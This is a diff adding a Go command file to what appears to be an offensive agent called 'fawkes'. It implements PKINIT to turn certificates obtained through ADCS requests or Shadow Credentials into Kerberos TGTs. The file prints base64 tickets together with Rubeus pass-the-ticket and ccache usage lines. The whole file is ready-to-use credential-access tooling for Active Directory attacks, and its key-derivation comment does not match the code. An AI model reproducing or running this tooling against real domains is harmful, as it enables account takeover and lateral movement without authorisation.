@@ -1,0 +1,729 @@
+// ticket_pkinit.go implements PKINIT (RFC 4556 / MS-PKCA) for certificate-based
+// Kerberos pre-authentication. Allows obtaining a TGT using a certificate (from
+// ADCS request or Shadow Credentials) instead of a password/hash.
+
+package commands
+
+import (
+	"crypto"
+	"crypto/ecdsa"
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha1"
+	"crypto/x509"
+	"encoding/base64"
+	"encoding/pem"
+	"fmt"
+	"math/big"
+	"strings"
+	"time"
+
+	"fawkes/pkg/structs"
+
+	gokrb5asn1 "github.com/jcmturner/gofork/encoding/asn1"
+	"github.com/jcmturner/gokrb5/v8/config"
+	krbcrypto "github.com/jcmturner/gokrb5/v8/crypto"
+	"github.com/jcmturner/gokrb5/v8/iana/nametype"
+	"github.com/jcmturner/gokrb5/v8/messages"
+	"github.com/jcmturner/gokrb5/v8/types"
+)
+
+// PKINIT OIDs
+var (
+	oidSignedData        = gokrb5asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 7, 2}
+	oidData              = gokrb5asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 7, 1}
+	oidPKINITAuthData    = gokrb5asn1.ObjectIdentifier{1, 3, 6, 1, 5, 2, 3, 1}
+	oidSHA1              = gokrb5asn1.ObjectIdentifier{1, 3, 14, 3, 2, 26}
+	oidSHA256            = gokrb5asn1.ObjectIdentifier{2, 16, 840, 1, 101, 3, 4, 2, 1}
+	oidRSAEncryption     = gokrb5asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 1, 1}
+	oidSHA1WithRSA       = gokrb5asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 1, 5}
+	oidSHA256WithRSA     = gokrb5asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 1, 11}
+	oidECDSAWithSHA256   = gokrb5asn1.ObjectIdentifier{1, 2, 840, 10045, 4, 3, 2}
+	oidDHPublicNumber    = gokrb5asn1.ObjectIdentifier{1, 2, 840, 10046, 2, 1}
+	oidPKINITDHKeyData   = gokrb5asn1.ObjectIdentifier{1, 3, 6, 1, 5, 2, 3, 2}
+	oidContentType       = gokrb5asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 9, 3}
+	oidMessageDigest     = gokrb5asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 9, 4}
+)
+
+// IKE Group 14 (2048-bit MODP) parameters from RFC 3526 Section 3.
+var (
+	dhGroup14P, _ = new(big.Int).SetString(
+		"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"+
+			"29024E088A67CC74020BBEA63B139B22514A08798E3404DD"+
+			"EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"+
+			"E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"+
+			"EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"+
+			"C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"+
+			"83655D23DCA3AD961C62F356208552BB9ED529077096966D"+
+			"670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"+
+			"E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"+
+			"DE2BCBF6955817183995497CEA956AE515D2261898FA0510"+
+			"15728E5A8AACAA68FFFFFFFFFFFFFFFF", 16)
+	dhGroup14G = big.NewInt(2)
+)
+
+// PKINIT ASN.1 types per RFC 4556 and MS-PKCA.
+
+type pkAuthenticator struct {
+	CUSec      int                    `asn1:"explicit,tag:0"`
+	CTime      time.Time              `asn1:"generalized,explicit,tag:1"`
+	Nonce      int                    `asn1:"explicit,tag:2"`
+	PaChecksum []byte                 `asn1:"explicit,tag:3"`
+}
+
+type authPack struct {
+	PKAuthenticator pkAuthenticator           `asn1:"explicit,tag:0"`
+	ClientPublicValue gokrb5asn1.RawValue     `asn1:"optional,explicit,tag:1"`
+}
+
+type algorithmIdentifier struct {
+	Algorithm  gokrb5asn1.ObjectIdentifier
+	Parameters gokrb5asn1.RawValue `asn1:"optional"`
+}
+
+type subjectPublicKeyInfo struct {
+	Algorithm algorithmIdentifier
+	PublicKey gokrb5asn1.BitString
+}
+
+type dhParams struct {
+	P *big.Int
+	G *big.Int
+	Q *big.Int `asn1:"optional"`
+}
+
+type contentInfo struct {
+	ContentType gokrb5asn1.ObjectIdentifier
+	Content     gokrb5asn1.RawValue `asn1:"explicit,tag:0"`
+}
+
+type signedData struct {
+	Version          int
+	DigestAlgorithms gokrb5asn1.RawValue `asn1:"set"`
+	EncapContentInfo encapContentInfo
+	Certificates     gokrb5asn1.RawValue `asn1:"optional,tag:0"`
+	SignerInfos      gokrb5asn1.RawValue `asn1:"set"`
+}
+
+type encapContentInfo struct {
+	EContentType gokrb5asn1.ObjectIdentifier
+	EContent     gokrb5asn1.RawValue `asn1:"optional,explicit,tag:0"`
+}
+
+type signerInfo struct {
+	Version            int
+	SID                issuerAndSerialNumber
+	DigestAlgorithm    algorithmIdentifier
+	SignedAttrs        gokrb5asn1.RawValue `asn1:"optional,tag:0"`
+	SignatureAlgorithm algorithmIdentifier
+	Signature          []byte
+}
+
+type issuerAndSerialNumber struct {
+	Issuer       gokrb5asn1.RawValue
+	SerialNumber *big.Int
+}
+
+type attribute struct {
+	Type   gokrb5asn1.ObjectIdentifier
+	Values gokrb5asn1.RawValue `asn1:"set"`
+}
+
+// PA-PK-AS-REQ per RFC 4556 Section 3.2.1.
+type paPkAsReq struct {
+	SignedAuthPack []byte              `asn1:"tag:0"`
+	TrustedCAs     gokrb5asn1.RawValue `asn1:"optional,tag:1"`
+	KDCPKId        []byte              `asn1:"optional,tag:2"`
+}
+
+// PA-PK-AS-REP DH variant per RFC 4556 Section 3.2.3.
+type paPkAsRepDH struct {
+	DHSignedData []byte `asn1:"tag:0"`
+}
+
+type kdcDHKeyInfo struct {
+	SubjectPublicKey gokrb5asn1.BitString `asn1:"explicit,tag:0"`
+	Nonce            int                  `asn1:"explicit,tag:1"`
+	DHKeyExpiration  time.Time            `asn1:"generalized,optional,explicit,tag:2"`
+}
+
+type pkinitCertKey struct {
+	Cert       *x509.Certificate
+	Key        crypto.PrivateKey
+	CertDER    []byte
+}
+
+func ticketPKINIT(args ticketArgs) structs.CommandResult {
+	if args.Realm == "" || args.Server == "" {
+		return errorResult("Error: realm and server (KDC) are required for pkinit")
+	}
+	if args.Username == "" {
+		return errorResult("Error: username is required (SAN/UPN from certificate or explicit)")
+	}
+
+	certPEM := args.Certificate
+	keyPEM := args.PrivateKey
+	if certPEM == "" || keyPEM == "" {
+		return errorResult("Error: certificate and private_key (PEM) are required for pkinit")
+	}
+
+	realm := strings.ToUpper(args.Realm)
+	if args.Format == "" {
+		args.Format = "kirbi"
+	}
+
+	// Parse certificate and private key
+	ck, err := parsePEMCertKey(certPEM, keyPEM)
+	if err != nil {
+		return errorf("Error loading certificate/key: %v", err)
+	}
+
+	// Resolve KDC
+	kdcAddr := args.Server
+	if !strings.Contains(kdcAddr, ":") {
+		kdcAddr += ":88"
+	}
+
+	// Create gokrb5 config
+	cfgStr := fmt.Sprintf(
+		"[libdefaults]\n  default_realm = %s\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n"+
+			"[realms]\n  %s = {\n    kdc = %s\n  }\n",
+		realm, realm, kdcAddr)
+	cfg, err := config.NewFromString(cfgStr)
+	if err != nil {
+		return errorf("Error creating Kerberos config: %v", err)
+	}
+
+	cname := types.PrincipalName{
+		NameType:   nametype.KRB_NT_PRINCIPAL,
+		NameString: []string{args.Username},
+	}
+
+	// Build AS-REQ
+	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
+	if err != nil {
+		return errorf("Error building AS-REQ: %v", err)
+	}
+
+	// PKINIT typically uses AES256
+	asReq.ReqBody.EType = []int32{18, 17} // aes256-cts, aes128-cts
+
+	// Marshal AS-REQ body for checksum
+	bodyBytes, err := gokrb5asn1.Marshal(asReq.ReqBody)
+	if err != nil {
+		return errorf("Error marshaling AS-REQ body: %v", err)
+	}
+
+	// Generate DH key pair (IKE Group 14 / 2048-bit)
+	dhPriv, dhPubBytes, err := generateDHKeyPair()
+	if err != nil {
+		return errorf("Error generating DH key pair: %v", err)
+	}
+
+	// Build SubjectPublicKeyInfo for DH
+	spki, err := buildDHSubjectPublicKeyInfo(dhPubBytes)
+	if err != nil {
+		return errorf("Error building DH SPKI: %v", err)
+	}
+
+	// Build PKAuthenticator
+	now := time.Now().UTC()
+	bodyChecksum := sha1.Sum(bodyBytes)
+	pkAuth := pkAuthenticator{
+		CUSec:      int(now.Nanosecond() / 1000),
+		CTime:      now,
+		Nonce:      int(asReq.ReqBody.Nonce),
+		PaChecksum: bodyChecksum[:],
+	}
+
+	// Build AuthPack
+	spkiRaw := gokrb5asn1.RawValue{FullBytes: spki}
+	ap := authPack{
+		PKAuthenticator:   pkAuth,
+		ClientPublicValue: spkiRaw,
+	}
+	authPackBytes, err := gokrb5asn1.Marshal(ap)
+	if err != nil {
+		return errorf("Error marshaling AuthPack: %v", err)
+	}
+
+	// Sign the AuthPack with CMS SignedData
+	signedAuthPack, err := buildCMSSignedData(authPackBytes, ck)
+	if err != nil {
+		return errorf("Error building CMS SignedData: %v", err)
+	}
+
+	// Build PA-PK-AS-REQ
+	req := paPkAsReq{
+		SignedAuthPack: signedAuthPack,
+	}
+	reqBytes, err := gokrb5asn1.Marshal(req)
+	if err != nil {
+		return errorf("Error marshaling PA-PK-AS-REQ: %v", err)
+	}
+
+	// Add PKINIT PA-DATA (type 16 = PA-PK-AS-REQ)
+	asReq.PAData = types.PADataSequence{
+		{PADataType: 16, PADataValue: reqBytes},
+	}
+
+	// Marshal and send AS-REQ
+	asReqBytes, err := asReq.Marshal()
+	if err != nil {
+		return errorf("Error marshaling AS-REQ: %v", err)
+	}
+
+	respBuf, err := ticketKDCSendRaw(asReqBytes, kdcAddr)
+	if err != nil {
+		return errorf("%v", err)
+	}
+
+	// Check for KRB-ERROR
+	if len(respBuf) > 0 && respBuf[0] == 0x7e {
+		var krbErr messages.KRBError
+		if err := krbErr.Unmarshal(respBuf); err == nil {
+			errMsg := ticketKrbErrorMsg(krbErr.ErrorCode)
+			if krbErr.EText != "" {
+				errMsg += ": " + krbErr.EText
+			}
+			return errorf("KDC error: %s (code %d)", errMsg, krbErr.ErrorCode)
+		}
+	}
+
+	// Parse AS-REP
+	var asRep messages.ASRep
+	if err := asRep.Unmarshal(respBuf); err != nil {
+		return errorf("Error parsing AS-REP: %v", err)
+	}
+
+	// Extract PA-PK-AS-REP from response PA-DATA
+	var paPkAsRepBytes []byte
+	for _, pa := range asRep.PAData {
+		if pa.PADataType == 17 { // PA-PK-AS-REP
+			paPkAsRepBytes = pa.PADataValue
+			break
+		}
+	}
+	if paPkAsRepBytes == nil {
+		return errorResult("Error: KDC response missing PA-PK-AS-REP (type 17)")
+	}
+
+	// Parse PA-PK-AS-REP (DH variant)
+	var rep paPkAsRepDH
+	if _, err := gokrb5asn1.Unmarshal(paPkAsRepBytes, &rep); err != nil {
+		return errorf("Error parsing PA-PK-AS-REP: %v", err)
+	}
+
+	// Extract KDC's DH public value from the signed reply
+	kdcDHPub, err := extractKDCDHPublicKey(rep.DHSignedData)
+	if err != nil {
+		return errorf("Error extracting KDC DH key: %v", err)
+	}
+
+	// Compute DH shared secret
+	sharedSecret := new(big.Int).Exp(kdcDHPub, dhPriv, dhGroup14P)
+	sharedSecretBytes := sharedSecret.Bytes()
+	defer structs.ZeroBytes(sharedSecretBytes)
+
+	// Derive session key from DH shared secret
+	// MS-PKCA uses SP800-56A Concatenation KDF with SHA1
+	sessionKeyBytes := pkinitDeriveKey(sharedSecretBytes, int(asReq.ReqBody.Nonce), 32) // 32 bytes for AES-256
+	defer structs.ZeroBytes(sessionKeyBytes)
+
+	sessionKey := types.EncryptionKey{
+		KeyType:  18, // aes256-cts-hmac-sha1-96
+		KeyValue: sessionKeyBytes,
+	}
+
+	// Decrypt the AS-REP EncPart using the derived session key
+	plainBytes, err := krbcrypto.DecryptEncPart(asRep.EncPart, sessionKey, 3)
+	if err != nil {
+		return errorf("Error decrypting AS-REP with derived key: %v", err)
+	}
+	var decPart messages.EncKDCRepPart
+	if err := decPart.Unmarshal(plainBytes); err != nil {
+		return errorf("Error parsing decrypted AS-REP: %v", err)
+	}
+
+	// Use the session key from the decrypted reply (not our derived one)
+	realSessionKey := decPart.Key
+	sname := decPart.SName
+	ticketFlags := decPart.Flags
+	authTime := decPart.AuthTime
+	endTime := decPart.EndTime
+	renewTill := decPart.RenewTill
+
+	// Format output
+	var output string
+	switch strings.ToLower(args.Format) {
+	case "kirbi":
+		kirbiBytes, err := ticketToKirbi(asRep.Ticket, realSessionKey, args.Username, realm, sname, ticketFlags, authTime, endTime, renewTill)
+		if err != nil {
+			return errorf("Error creating kirbi: %v", err)
+		}
+		output = pkinitFormatOutput(args.Username, realm, ck.Cert, realSessionKey, authTime, endTime, "kirbi", base64.StdEncoding.EncodeToString(kirbiBytes))
+	case "ccache":
+		ticketBytes, err := asRep.Ticket.Marshal()
+		if err != nil {
+			return errorf("Error marshaling ticket: %v", err)
+		}
+		ccacheBytes := ticketToCCache(ticketBytes, realSessionKey, args.Username, realm, sname, ticketFlags, authTime, endTime, renewTill)
+		output = pkinitFormatOutput(args.Username, realm, ck.Cert, realSessionKey, authTime, endTime, "ccache", base64.StdEncoding.EncodeToString(ccacheBytes))
+	default:
+		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
+	}
+
+	return successResult(output)
+}
+
+func pkinitFormatOutput(username, realm string, cert *x509.Certificate, key types.EncryptionKey, authTime, endTime time.Time, format, b64 string) string {
+	var sb strings.Builder
+	sb.WriteString("[*] PKINIT AS exchange successful\n")
+	sb.WriteString(fmt.Sprintf("    User:        %s@%s\n", username, realm))
+	sb.WriteString(fmt.Sprintf("    Certificate: %s\n", cert.Subject.CommonName))
+	sb.WriteString(fmt.Sprintf("    Issuer:      %s\n", cert.Issuer.CommonName))
+	sb.WriteString(fmt.Sprintf("    Serial:      %s\n", cert.SerialNumber.Text(16)))
+	sb.WriteString(fmt.Sprintf("    Session Key: etype %d (%d bytes)\n", key.KeyType, len(key.KeyValue)))
+	sb.WriteString(fmt.Sprintf("    Valid:       %s — %s\n", authTime.Format("2006-01-02 15:04:05 UTC"), endTime.Format("2006-01-02 15:04:05 UTC")))
+	sb.WriteString(fmt.Sprintf("    Format:      %s\n", format))
+	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket:\n%s\n", format, b64))
+	if format == "kirbi" {
+		sb.WriteString("\n[*] Usage: Rubeus.exe ptt /ticket:<base64>\n")
+	} else {
+		sb.WriteString("\n[*] Usage: echo '<base64>' | base64 -d > /tmp/krb5cc_pkinit\n")
+		sb.WriteString("[*] Usage: export KRB5CCNAME=/tmp/krb5cc_pkinit\n")
+	}
+	return sb.String()
+}
+
+// parsePEMCertKey loads a certificate and private key from PEM-encoded strings.
+func parsePEMCertKey(certPEM, keyPEM string) (*pkinitCertKey, error) {
+	certBlock, _ := pem.Decode([]byte(certPEM))
+	if certBlock == nil {
+		return nil, fmt.Errorf("failed to decode certificate PEM")
+	}
+	cert, err := x509.ParseCertificate(certBlock.Bytes)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse certificate: %w", err)
+	}
+
+	keyBlock, _ := pem.Decode([]byte(keyPEM))
+	if keyBlock == nil {
+		return nil, fmt.Errorf("failed to decode private key PEM")
+	}
+	var key crypto.PrivateKey
+	switch keyBlock.Type {
+	case "RSA PRIVATE KEY":
+		key, err = x509.ParsePKCS1PrivateKey(keyBlock.Bytes)
+	case "EC PRIVATE KEY":
+		key, err = x509.ParseECPrivateKey(keyBlock.Bytes)
+	case "PRIVATE KEY":
+		key, err = x509.ParsePKCS8PrivateKey(keyBlock.Bytes)
+	default:
+		return nil, fmt.Errorf("unsupported key type: %s", keyBlock.Type)
+	}
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse private key: %w", err)
+	}
+
+	return &pkinitCertKey{
+		Cert:    cert,
+		Key:     key,
+		CertDER: certBlock.Bytes,
+	}, nil
+}
+
+// generateDHKeyPair generates a DH key pair using IKE Group 14 (2048-bit).
+func generateDHKeyPair() (priv *big.Int, pubBytes []byte, err error) {
+	// Generate random private key (256-bit is sufficient for DH Group 14)
+	privBytes := make([]byte, 32)
+	if _, err := rand.Read(privBytes); err != nil {
+		return nil, nil, fmt.Errorf("failed to generate DH private key: %w", err)
+	}
+	priv = new(big.Int).SetBytes(privBytes)
+
+	// Compute public key: g^x mod p
+	pub := new(big.Int).Exp(dhGroup14G, priv, dhGroup14P)
+	pubBytes = pub.Bytes()
+
+	// Pad to 256 bytes (2048 bits)
+	if len(pubBytes) < 256 {
+		padded := make([]byte, 256)
+		copy(padded[256-len(pubBytes):], pubBytes)
+		pubBytes = padded
+	}
+
+	return priv, pubBytes, nil
+}
+
+// buildDHSubjectPublicKeyInfo constructs a SubjectPublicKeyInfo for DH.
+func buildDHSubjectPublicKeyInfo(pubBytes []byte) ([]byte, error) {
+	// DH parameters (P, G)
+	params := dhParams{P: dhGroup14P, G: dhGroup14G}
+	paramsBytes, err := gokrb5asn1.Marshal(params)
+	if err != nil {
+		return nil, fmt.Errorf("failed to marshal DH params: %w", err)
+	}
+
+	spki := subjectPublicKeyInfo{
+		Algorithm: algorithmIdentifier{
+			Algorithm:  oidDHPublicNumber,
+			Parameters: gokrb5asn1.RawValue{FullBytes: paramsBytes},
+		},
+		PublicKey: gokrb5asn1.BitString{
+			Bytes:     pubBytes,
+			BitLength: len(pubBytes) * 8,
+		},
+	}
+	return gokrb5asn1.Marshal(spki)
+}
+
+// buildCMSSignedData creates a CMS SignedData structure signing the AuthPack.
+func buildCMSSignedData(authPackBytes []byte, ck *pkinitCertKey) ([]byte, error) {
+	// Determine signature algorithm based on key type
+	var digestOID, sigOID gokrb5asn1.ObjectIdentifier
+	var hashFunc crypto.Hash
+	switch ck.Key.(type) {
+	case *rsa.PrivateKey:
+		digestOID = oidSHA256
+		sigOID = oidSHA256WithRSA
+		hashFunc = crypto.SHA256
+	case *ecdsa.PrivateKey:
+		digestOID = oidSHA256
+		sigOID = oidECDSAWithSHA256
+		hashFunc = crypto.SHA256
+	default:
+		return nil, fmt.Errorf("unsupported key type for signing")
+	}
+
+	// Build encapsulated content
+	eContentOctetString, err := gokrb5asn1.Marshal(gokrb5asn1.RawValue{
+		Class: gokrb5asn1.ClassUniversal,
+		Tag:   gokrb5asn1.TagOctetString,
+		Bytes: authPackBytes,
+	})
+	if err != nil {
+		return nil, fmt.Errorf("failed to marshal eContent: %w", err)
+	}
+
+	encapContent := encapContentInfo{
+		EContentType: oidPKINITAuthData,
+		EContent:     gokrb5asn1.RawValue{FullBytes: eContentOctetString},
+	}
+
+	// Compute digest of AuthPack
+	h := hashFunc.New()
+	h.Write(authPackBytes)
+	digest := h.Sum(nil)
+
+	// Build signed attributes
+	contentTypeAttr := attribute{
+		Type: oidContentType,
+		Values: gokrb5asn1.RawValue{
+			Class:      gokrb5asn1.ClassUniversal,
+			Tag:        gokrb5asn1.TagSet,
+			IsCompound: true,
+		},
+	}
+	contentTypeOIDBytes, _ := gokrb5asn1.Marshal(oidPKINITAuthData)
+	contentTypeAttr.Values.Bytes = contentTypeOIDBytes
+
+	digestAttr := attribute{
+		Type: oidMessageDigest,
+		Values: gokrb5asn1.RawValue{
+			Class:      gokrb5asn1.ClassUniversal,
+			Tag:        gokrb5asn1.TagSet,
+			IsCompound: true,
+		},
+	}
+	digestOctetBytes, _ := gokrb5asn1.Marshal(gokrb5asn1.RawValue{
+		Class: gokrb5asn1.ClassUniversal,
+		Tag:   gokrb5asn1.TagOctetString,
+		Bytes: digest,
+	})
+	digestAttr.Values.Bytes = digestOctetBytes
+
+	attrs := []attribute{contentTypeAttr, digestAttr}
+	attrsBytes, err := gokrb5asn1.Marshal(attrs)
+	if err != nil {
+		return nil, fmt.Errorf("failed to marshal signed attrs: %w", err)
+	}
+
+	// For signing: SET OF (tag 0x31) version of the attributes
+	signedAttrsForSig := make([]byte, len(attrsBytes))
+	copy(signedAttrsForSig, attrsBytes)
+	if len(signedAttrsForSig) > 0 {
+		signedAttrsForSig[0] = 0x31 // SEQUENCE → SET for signature computation
+	}
+
+	// Sign the attributes
+	h2 := hashFunc.New()
+	h2.Write(signedAttrsForSig)
+	attrDigest := h2.Sum(nil)
+
+	var signature []byte
+	switch key := ck.Key.(type) {
+	case *rsa.PrivateKey:
+		signature, err = rsa.SignPKCS1v15(rand.Reader, key, hashFunc, attrDigest)
+	case *ecdsa.PrivateKey:
+		signature, err = ecdsa.SignASN1(rand.Reader, key, attrDigest)
+	}
+	if err != nil {
+		return nil, fmt.Errorf("failed to sign: %w", err)
+	}
+
+	// Wrap signed attrs with IMPLICIT [0] tag
+	signedAttrsTagged := make([]byte, len(attrsBytes))
+	copy(signedAttrsTagged, attrsBytes)
+	if len(signedAttrsTagged) > 0 {
+		signedAttrsTagged[0] = 0xa0 // context-specific [0] constructed
+	}
+
+	// Build SignerInfo
+	si := signerInfo{
+		Version: 1,
+		SID: issuerAndSerialNumber{
+			Issuer:       gokrb5asn1.RawValue{FullBytes: ck.Cert.RawIssuer},
+			SerialNumber: ck.Cert.SerialNumber,
+		},
+		DigestAlgorithm:    algorithmIdentifier{Algorithm: digestOID},
+		SignedAttrs:        gokrb5asn1.RawValue{FullBytes: signedAttrsTagged},
+		SignatureAlgorithm: algorithmIdentifier{Algorithm: sigOID},
+		Signature:          signature,
+	}
+	siBytes, err := gokrb5asn1.Marshal(si)
+	if err != nil {
+		return nil, fmt.Errorf("failed to marshal SignerInfo: %w", err)
+	}
+
+	// Digest algorithm SET
+	digestAlgBytes, err := gokrb5asn1.Marshal(algorithmIdentifier{Algorithm: digestOID})
+	if err != nil {
+		return nil, fmt.Errorf("failed to marshal digest alg: %w", err)
+	}
+	digestAlgSet := gokrb5asn1.RawValue{
+		Class:      gokrb5asn1.ClassUniversal,
+		Tag:        gokrb5asn1.TagSet,
+		IsCompound: true,
+		Bytes:      digestAlgBytes,
+	}
+
+	// Certificates [0] IMPLICIT
+	certSetBytes := gokrb5asn1.RawValue{
+		Class:      gokrb5asn1.ClassContextSpecific,
+		Tag:        0,
+		IsCompound: true,
+		Bytes:      ck.CertDER,
+	}
+
+	// SignerInfos SET
+	siSet := gokrb5asn1.RawValue{
+		Class:      gokrb5asn1.ClassUniversal,
+		Tag:        gokrb5asn1.TagSet,
+		IsCompound: true,
+		Bytes:      siBytes,
+	}
+
+	// Build SignedData
+	sd := signedData{
+		Version:          3, // PKINIT uses version 3 (has certificates)
+		DigestAlgorithms: digestAlgSet,
+		EncapContentInfo: encapContent,
+		Certificates:     certSetBytes,
+		SignerInfos:      siSet,
+	}
+	sdBytes, err := gokrb5asn1.Marshal(sd)
+	if err != nil {
+		return nil, fmt.Errorf("failed to marshal SignedData: %w", err)
+	}
+
+	// Wrap in ContentInfo
+	ci := contentInfo{
+		ContentType: oidSignedData,
+		Content:     gokrb5asn1.RawValue{FullBytes: sdBytes},
+	}
+	return gokrb5asn1.Marshal(ci)
+}
+
+// extractKDCDHPublicKey extracts the KDC's DH public key from the signed reply.
+func extractKDCDHPublicKey(dhSignedDataBytes []byte) (*big.Int, error) {
+	// Parse the outer ContentInfo
+	var ci contentInfo
+	if _, err := gokrb5asn1.Unmarshal(dhSignedDataBytes, &ci); err != nil {
+		return nil, fmt.Errorf("failed to parse KDC reply ContentInfo: %w", err)
+	}
+
+	// Parse SignedData
+	var sd signedData
+	if _, err := gokrb5asn1.Unmarshal(ci.Content.FullBytes, &sd); err != nil {
+		// Try with the Bytes field
+		if _, err2 := gokrb5asn1.Unmarshal(ci.Content.Bytes, &sd); err2 != nil {
+			return nil, fmt.Errorf("failed to parse KDC SignedData: %w (also tried: %w)", err, err2)
+		}
+	}
+
+	// Extract encapsulated content (KDCDHKeyInfo)
+	var eContentOctetString gokrb5asn1.RawValue
+	if _, err := gokrb5asn1.Unmarshal(sd.EncapContentInfo.EContent.FullBytes, &eContentOctetString); err != nil {
+		if _, err2 := gokrb5asn1.Unmarshal(sd.EncapContentInfo.EContent.Bytes, &eContentOctetString); err2 != nil {
+			return nil, fmt.Errorf("failed to extract KDC DH content: %w", err)
+		}
+	}
+
+	var kdcInfo kdcDHKeyInfo
+	raw := eContentOctetString.Bytes
+	if len(raw) == 0 {
+		raw = eContentOctetString.FullBytes
+	}
+	if _, err := gokrb5asn1.Unmarshal(raw, &kdcInfo); err != nil {
+		return nil, fmt.Errorf("failed to parse KDCDHKeyInfo: %w", err)
+	}
+
+	pubKey := new(big.Int).SetBytes(kdcInfo.SubjectPublicKey.Bytes)
+	return pubKey, nil
+}
+
+// pkinitDeriveKey derives a session key from the DH shared secret using SP800-56A
+// Concatenation KDF (as specified by MS-PKCA for PKINIT key derivation).
+func pkinitDeriveKey(sharedSecret []byte, nonce int, keyLen int) []byte {
+	// SP800-56A Concatenation KDF: key = KDF(Z, OtherInfo)
+	// For MS-PKCA PKINIT:
+	//   Hash = SHA1
+	//   Z = DH shared secret
+	//   OtherInfo = counter(4) || "PKINIT" || nonce(4) || keyLength(4)
+	//
+	// Simplified: iterate SHA1(counter || Z || OtherInfo) until enough bytes
+	var derived []byte
+	counter := uint32(1)
+
+	nonceBytes := make([]byte, 4)
+	nonceBytes[0] = byte(nonce >> 24)
+	nonceBytes[1] = byte(nonce >> 16)
+	nonceBytes[2] = byte(nonce >> 8)
+	nonceBytes[3] = byte(nonce)
+
+	keyLenBits := uint32(keyLen * 8)
+	klBytes := make([]byte, 4)
+	klBytes[0] = byte(keyLenBits >> 24)
+	klBytes[1] = byte(keyLenBits >> 16)
+	klBytes[2] = byte(keyLenBits >> 8)
+	klBytes[3] = byte(keyLenBits)
+
+	for len(derived) < keyLen {
+		h := sha1.New()
+		ctrBytes := make([]byte, 4)
+		ctrBytes[0] = byte(counter >> 24)
+		ctrBytes[1] = byte(counter >> 16)
+		ctrBytes[2] = byte(counter >> 8)
+		ctrBytes[3] = byte(counter)
+		h.Write(ctrBytes)
+		h.Write(sharedSecret)
+		h.Write(nonceBytes)
+		h.Write(klBytes)
+		derived = append(derived, h.Sum(nil)...)
+		counter++
+	}
+
+	return derived[:keyLen]
+}
+
